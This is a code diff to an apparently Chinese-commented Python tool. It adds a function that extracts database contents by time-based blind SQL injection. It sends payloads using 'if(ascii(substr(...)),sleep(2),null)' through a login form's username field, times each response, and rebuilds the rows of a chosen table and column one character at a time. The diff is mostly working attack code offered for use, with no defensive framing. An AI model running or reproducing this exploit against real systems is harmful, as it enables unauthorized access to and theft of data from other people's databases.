@@ -17,14 +17,20 @@ haveget:
                     0:一共有几个表
                     1:第一个表名字
                     2:第二个表名字
-                    ………………
-
+                    ………………     
         column:列名字
                 [table]:当前表
                         0:一共有几列
                         1:第一列
                         2:第二列
                         ………………
+        data:
+            [table]:表名
+                    [column]:列名
+                            0:一共有几行
+                            1:第一行数据
+                            2:第二行数据
+                            ………………
 
 
 '''
@@ -179,16 +185,86 @@ def get_column():
         haveget['column'][table][0] = currColumnIndex - 1
 
 
-# # 获取数据
-# def get_data(table):
-#     # 列的标记
-#
-#     global haveget
-#
-#     datas=''
-#     # 优化点，凡是写死curr的地方都要优化
-#     for i in range(1,haveget['column'][table][0]):
-#         column=haveget['column'][table][i]
+# 获取数据
+def get_data():
+    global haveget
+
+    '''---------------------------------处理选择--------------------------------------'''
+
+    print('-------表单-------')
+    for k, v in haveget['table']['curr'].items():
+        if k != 0: print(str(k) + ': ' + v)
+    print('-------表单-------\n')
+    id = int(input('选择要爆破的表单编号:'))
+    print('\n-------列名-------')
+    try:
+        for k, v in haveget['column'][haveget['table']['curr'][id]].items():
+            if k != 0:
+                print(str(k) + ': ' + v)
+    except:
+        print('抱歉，输入表单编号不存在！')
+        exit()
+    print('-------列名-------\n')
+
+    table = haveget['table']['curr'][id]
+
+    id = int(input('选择要爆破的列编号:'))
+    print()
+    try:
+        column = haveget['column'][table][id]
+    except:
+        print('抱歉，输入列编号不存在！')
+        exit()
+
+    '''---------------------------------处理选择--------------------------------------'''
+
+    try:
+        haveget['data'][table][column][0]
+    except:
+        haveget['data'] = {table: {column: {0: 0}}}
+
+    '''---------------------------------爆破数据--------------------------------------'''
+    retdata = ''
+    currRowIndex = 1
+    # 最多能扫描到行
+    for j in range(100):
+        # 当前列扫描完毕标志
+        columnDataGetComplete = True
+        # 最多能扫描行内存储数据长度为1000
+        for i in range(1, 1000):
+            # 当前行数据扫描完毕标志
+            rowDataGetComplete = True
+            # 遍历字典
+            for v in value:
+                # 一般payload，优化点与前述相同
+                payload = "test' and if(ascii(substr((select {0} from {1} limit {2}, 1), {3},1))={4},sleep(2),null) #".format(
+                    column, table, j, i, ord(v))
+                data = {"username": payload, "password": '123'}
+                start_time = time.time()
+                requests.post(url, data=data)
+                end_time = time.time()
+                use_time = end_time - start_time
+                if use_time > 1.5:
+                    # 如果当前行还能获取到数据，则该行数据还未获取完毕
+                    rowDataGetComplete = False
+                    retdata += v
+                    print("\r", "......" + retdata, end="", flush=True)
+                    break
+            # 如果当前行数据获取完毕，判断当前获取的数据是否为空，不为空则说明还有行数据未获取
+            if rowDataGetComplete:
+                if retdata != '':
+                    columnDataGetComplete = False
+                    # 将获取到的数据存入当前数据库中
+                    print("\r", ".....the line {0} of {1}-{2} data is :".format(currRowIndex, table, column) + retdata,
+                          flush=True)
+                    haveget['data'][table][column][currRowIndex] = retdata
+                    currRowIndex += 1
+                retdata = ''
+                break
+        # 如果当前数据库全部表单获取完毕，break
+        if columnDataGetComplete: break
+    haveget['data'][table][column][0] = currRowIndex - 1
+    return
 
 
 if __name__ == "__main__":
@@ -213,7 +289,8 @@ if __name__ == "__main__":
         get_table()
         logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_column()
-        print(haveget)
+        logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        get_data()
         logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
     else:
         if args.get == 'database':
